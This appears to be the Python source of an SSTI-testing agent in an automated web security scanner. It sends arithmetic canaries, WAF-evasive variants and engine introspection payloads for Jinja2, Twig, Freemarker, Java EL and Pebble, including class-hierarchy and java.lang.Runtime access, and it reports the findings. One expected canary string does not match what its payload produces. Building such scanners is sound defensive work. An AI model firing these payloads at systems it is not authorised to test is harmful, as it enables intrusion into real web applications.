"""
SSTI agent — server-side template injection with engine-aware detection.

Strategy:
  1. Fingerprint template engine from tech stack (Wappalyzer) or response clues
  2. Send engine-specific arithmetic canaries (large prime products)
  3. If WAF blocks, use reflection/introspection probes that don't contain
     obvious math operators but confirm code execution context
  4. On detection, use mutator for deeper exploitation (RCE proof)

Detection evidence:
  - Arithmetic product appears in response (e.g. 79014691 from 8887*8893)
  - Template engine class/method name reflected (introspection)
  - Error message reveals template engine type (Jinja2, Freemarker, etc.)
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, List, Optional

from dast.ai.agent_base import AgentFinding, VulnAgent
from dast.ai.coordinator import Coordinator
from dast.payloads.loader import get_payloads
from dast.proxy.plugin_manager import log_event
from dast.scanners.active_checks import _fmt_http_pair, _inject_query, _send
from dast.utils.logger import get_logger

if TYPE_CHECKING:
    import httpx
    from dast.scanners.active_checks import CheckTarget
    from dast.scanners.collaborator import CollaboratorService

logger = get_logger(__name__)

# Engine-specific probes — introspection payloads that confirm execution
# without needing arithmetic (WAF-friendly)
_INTROSPECTION_PROBES = [
    # Jinja2 — access class hierarchy
    {"payload": "{{cycler.__init__.__globals__.keys()|list}}", "engine": "jinja2",
     "detect": re.compile(r"(os|sys|builtins|subprocess|_thread)", re.I)},
    {"payload": "{{''.__class__.__mro__}}", "engine": "jinja2",
     "detect": re.compile(r"<class '(str|object)'>", re.I)},
    # Twig — env reflection
    {"payload": "{{_self.env.getExtension('Twig\\\\Extension\\\\CoreExtension')}}", "engine": "twig",
     "detect": re.compile(r"Twig.*Extension|CoreExtension", re.I)},
    # Freemarker — built-in reflection
    {"payload": "${.version}", "engine": "freemarker",
     "detect": re.compile(r"2\.\d+\.\d+", re.I)},
    {"payload": "<#assign classloader=object.class.forName('java.lang.Runtime')>${classloader}", "engine": "freemarker",
     "detect": re.compile(r"class java\.lang|Runtime", re.I)},
    # EL (Java) — class access
    {"payload": "${T(java.lang.System).getProperty('os.name')}", "engine": "el",
     "detect": re.compile(r"(Linux|Windows|Mac OS)", re.I)},
    # Pebble — Java access
    {"payload": "{% set cmd = 'id' %}{% set runtime = beans.get('runtime') %}{{runtime}}", "engine": "pebble",
     "detect": re.compile(r"java\.lang\.Runtime|ProcessBuilder", re.I)},
]

# WAF-evasive arithmetic variants
_EVASIVE_CANARIES = [
    # URL-encoded
    {"payload": "%7B%7B8887*8893%7D%7D", "expected": "79014691", "engines": ["jinja2", "twig"]},
    # With spaces
    {"payload": "{{ 8887 * 8893 }}", "expected": "79014691", "engines": ["jinja2", "twig"]},
    # String concat approach (no math operators)
    {"payload": "{{'dast'~'ssti'}}", "expected": "dastststi", "engines": ["jinja2", "twig"]},
    # Using filter
    {"payload": "{{8887|int * 8893}}", "expected": "79014691", "engines": ["jinja2"]},
    # Freemarker alt
    {"payload": "${8887?c?number * 8893}", "expected": "79014691", "engines": ["freemarker"]},
]

_PRODUCT_RE = re.compile(r"\b79014691\b")
_PRODUCT_ALT_RE = re.compile(r"\b84232313\b")
_CANARY_STR_RE = re.compile(r"dastststi")

# Error patterns that reveal template engine
_ENGINE_ERROR_RE = re.compile(
    r"(jinja2\.exceptions|twig.*error|freemarker\.template|"
    r"pebble.*template|thymeleaf.*expression|"
    r"TemplateDoesNotExist|UndefinedError|"
    r"com\.mitchellbosecke\.pebble|"
    r"org\.springframework\.expression|"
    r"velocity.*exception)",
    re.I,
)


class SstiAgent(VulnAgent):
    name = "SSTI Agent"
    attack_type = "ssti"
    description = "Tests for server-side template injection with engine fingerprinting and WAF evasion"

    async def run(
        self,
        target: "CheckTarget",
        client: "httpx.AsyncClient",
        collaborator: Optional["CollaboratorService"] = None,
    ) -> List[AgentFinding]:
        findings: List[AgentFinding] = []

        params = [p for p in target.params if p.get("type") not in ("token", "boolean")]
        if not params:
            logger.debug("ssti: no injectable params", url=target.url)
            return []

        # Detect probable engine from tech stack
        known_engines: List[str] = []
        discovery_ctx = target.discovery_context
        if discovery_ctx:
            tech_lower = " ".join(str(t) for t in (discovery_ctx.technologies or [])).lower()
            if "jinja" in tech_lower or "flask" in tech_lower or "django" in tech_lower:
                known_engines.append("jinja2")
            if "twig" in tech_lower or "symfony" in tech_lower or "laravel" in tech_lower:
                known_engines.append("twig")
            if "freemarker" in tech_lower or "spring" in tech_lower or "java" in tech_lower:
                known_engines.extend(["freemarker", "el"])
            if "pebble" in tech_lower:
                known_engines.append("pebble")

        logger.info("ssti: testing %d param(s) on %s, engines=%s",
                    len(params), target.url, known_engines or "unknown")

        # Load detection payloads from YAML
        detection_payloads = get_payloads("ssti", "detection") or []

        for param in params[:6]:
            param_name = param.get("name", "")
            if not param_name:
                continue

            # Phase 1: standard arithmetic canaries
            for p_entry in detection_payloads:
                if isinstance(p_entry, dict):
                    payload = p_entry.get("payload", "")
                    expected = p_entry.get("expected", "")
                    engines = p_entry.get("engines", [])
                else:
                    payload = str(p_entry)
                    expected = "79014691"
                    engines = []

                if known_engines and engines and not any(e in known_engines for e in engines):
                    continue

                finding = await self._probe(target, client, param_name, payload, expected, engines)
                if finding:
                    findings.append(finding)
                    return findings

            # Phase 2: WAF-evasive canaries
            for canary in _EVASIVE_CANARIES:
                if known_engines and not any(e in known_engines for e in canary["engines"]):
                    continue
                finding = await self._probe(
                    target, client, param_name, canary["payload"], canary["expected"], canary["engines"]
                )
                if finding:
                    findings.append(finding)
                    return findings

            # Phase 3: Introspection probes (no math — bypasses WAF)
            for probe in _INTROSPECTION_PROBES:
                if known_engines and probe["engine"] not in known_engines:
                    continue
                finding = await self._introspection_probe(
                    target, client, param_name, probe["payload"], probe["engine"], probe["detect"]
                )
                if finding:
                    findings.append(finding)
                    return findings

        return findings

    async def _probe(
        self, target: "CheckTarget", client: "httpx.AsyncClient",
        param_name: str, payload: str, expected: str, engines: List[str],
    ) -> Optional[AgentFinding]:
        url = _inject_query(target.url, param_name, payload)
        resp = await _send(client, target.method, url, target.headers, target.body, payload=payload)
        if not resp:
            return None

        body = resp.text[:8000]

        # Check if the raw payload is echoed (stored, not evaluated)
        if payload in body:
            return None

        # Check for expected output
        detected = False
        if expected and expected in body:
            detected = True
        elif _PRODUCT_RE.search(body) or _PRODUCT_ALT_RE.search(body):
            detected = True
        elif _CANARY_STR_RE.search(body):
            detected = True

        if not detected:
            # Check for engine error disclosure
            if _ENGINE_ERROR_RE.search(body):
                raw_req, raw_resp = _fmt_http_pair(resp)
                engine_match = _ENGINE_ERROR_RE.search(body).group(1)
                return AgentFinding(
                    title="Template Engine Error Disclosure (SSTI indicator)",
                    severity="medium",
                    cwe="CWE-1336",
                    attack_type="ssti",
                    evidence=(
                        f"Parameter '{param_name}' triggered a template engine error: "
                        f"'{engine_match}'. This confirms server-side template processing "
                        f"and indicates SSTI may be achievable with proper payload.\n\n"
                        f"Request:\n{raw_req}\n\nResponse:\n{raw_resp[:2000]}"
                    ),
                    payload=payload,
                    parameter=param_name,
                    url=target.url,
                    request_method=target.method,
                    raw_request=raw_req,
                    raw_response=raw_resp[:2000],
                )
            return None

        raw_req, raw_resp = _fmt_http_pair(resp)
        engine_label = "/".join(engines) if engines else "unknown"
        log_event("agent", "finding",
                  f"SSTI confirmed: {param_name} on {target.url} (engine: {engine_label})",
                  url=target.url, finding="SSTI", source="agent")

        return AgentFinding(
            title="Server-Side Template Injection (SSTI)",
            severity="critical",
            cwe="CWE-1336",
            attack_type="ssti",
            evidence=(
                f"Parameter '{param_name}' evaluated arithmetic expression '{payload}' "
                f"and returned '{expected}' in response body. "
                f"Engine(s): {engine_label}. "
                f"This confirms arbitrary code execution via template injection.\n\n"
                f"Request:\n{raw_req}\n\nResponse:\n{raw_resp[:2000]}"
            ),
            confirmed=True,
            payload=payload,
            parameter=param_name,
            url=target.url,
            request_method=target.method,
            bypass_validation=True,
            raw_request=raw_req,
            raw_response=raw_resp[:2000],
        )

    async def _introspection_probe(
        self, target: "CheckTarget", client: "httpx.AsyncClient",
        param_name: str, payload: str, engine: str, detect_re: re.Pattern,
    ) -> Optional[AgentFinding]:
        url = _inject_query(target.url, param_name, payload)
        resp = await _send(client, target.method, url, target.headers, target.body, payload=payload)
        if not resp:
            return None

        body = resp.text[:8000]
        if payload in body:
            return None

        match = detect_re.search(body)
        if not match:
            return None

        raw_req, raw_resp = _fmt_http_pair(resp)
        log_event("agent", "finding",
                  f"SSTI introspection: {param_name} ({engine}) on {target.url}",
                  url=target.url, finding="SSTI introspection", source="agent")

        return AgentFinding(
            title=f"Server-Side Template Injection — {engine} introspection",
            severity="critical",
            cwe="CWE-1336",
            attack_type="ssti",
            evidence=(
                f"Parameter '{param_name}' executed introspection payload for {engine}: "
                f"'{payload}' — response contains '{match.group(0)}', confirming "
                f"server-side code execution in the template context.\n\n"
                f"Request:\n{raw_req}\n\nResponse:\n{raw_resp[:2000]}"
            ),
            confirmed=True,
            payload=payload,
            parameter=param_name,
            url=target.url,
            request_method=target.method,
            bypass_validation=True,
            raw_request=raw_req,
            raw_response=raw_resp[:2000],
        )


Coordinator.register(SstiAgent)
